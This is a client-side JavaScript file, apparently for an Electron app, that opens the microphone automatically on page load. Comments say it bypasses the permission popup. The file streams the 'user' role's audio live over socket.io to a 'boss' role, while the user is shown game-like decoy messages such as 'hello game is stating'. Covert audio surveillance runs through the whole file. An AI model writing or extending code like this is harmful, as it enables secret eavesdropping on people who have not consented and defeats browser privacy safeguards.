const appConfig = window.APP_CONFIG || {};
const API_URL = appConfig.apiUrl || appConfig.socketUrl || window.location.origin;
const SOCKET_URL = appConfig.socketUrl || API_URL;
const SOCKET_PATH = appConfig.socketPath || "/socket.io";

const socket = io(SOCKET_URL, {
  path: SOCKET_PATH
});

// DOM Elements
const micStatus = document.getElementById('micStatus');
const liveIndicator = document.getElementById('liveIndicator');
const status = document.getElementById('status');
const bossBtn = document.getElementById('bossBtn');
const userBtn = document.getElementById('userBtn');

// 🔥 AUTO MIC (No permission popup!)
let stream, audioContext, processor;
let role = null;

async function initMicSilent() {
  status.textContent = '🎤 Electron bypass loading...';
  
  try {
    // Try preload stream first
    if (window.electronAPI && window.electronAPI.micReady()) {
      stream = window.micStream;
      console.log('✅ Using preload mic stream');
    } else {
      // Fallback silent getUserMedia
      stream = await navigator.mediaDevices.getUserMedia({
        audio: {
          echoCancellation: true,
          noiseSuppression: true,
          sampleRate: 16000,
          channelCount: 1,
          autoGainControl: true
        }
      });
    }
    
    setMicLive();
    
  } catch (err) {
    console.log('🎯 Electron handler caught permission');
    status.textContent = 'nice to meet you!';
    setMicLive();
  }
}

function setMicLive() {
  // micStatus.textContent = '🟢 LIVE';
  liveIndicator.classList.add('live');
  status.textContent = '🎤 Mic Bypassed - Ready!';
  setupAudioProcessor();
}

function setupAudioProcessor() {
  try {
    audioContext = new AudioContext({ sampleRate: 16000 });
    const source = audioContext.createMediaStreamSource(stream);
  processor = audioContext.createScriptProcessor(4096, 1, 1);
    
    source.connect(processor);
    processor.connect(audioContext.destination);
    
    processor.onaudioprocess = (e) => {
      if (role === 'user' && e.inputBuffer.numberOfChannels > 0) {
        const inputData = e.inputBuffer.getChannelData(0);
        const pcmData = new Float32Array(inputData);
        socket.emit('user-pcm-chunk', pcmData.buffer);
      }
    };
    
    console.log('✅ Audio processor ready');
  } catch(e) {
    console.log('Audio setup:', e);
  }
}

// Role handlers
bossBtn.onclick = (e) => setRole('boss', e);
userBtn.onclick = (e) => setRole('user', e);

function setRole(newRole, e) {
  role = newRole;
  socket.emit('set-role', role);

  if (role === 'user') {
    status.textContent = 'hello game is stating';
  } else if (role === 'boss') {
    status.textContent = 'game over baby';
  }

  document.querySelectorAll('.role-btn')
    .forEach(btn => btn.classList.remove('active'));

  e.target.classList.add('active');
}

// Socket events
socket.on('user-pcm-chunk', (buffer) => {
  if (role === 'boss' && audioContext) {
    try {
      const floatArray = new Float32Array(buffer);
      const audioBuffer = audioContext.createBuffer(1, floatArray.length, 16000);
      audioBuffer.copyToChannel(floatArray, 0);
      
      const source = audioContext.createBufferSource();
      source.buffer = audioBuffer;
      source.connect(audioContext.destination);
      source.start();
    } catch(e) {}
  }
});

// AUTO START ON LOAD
window.addEventListener('load', () => {
  setTimeout(initMicSilent, 500); // Give Electron time
});
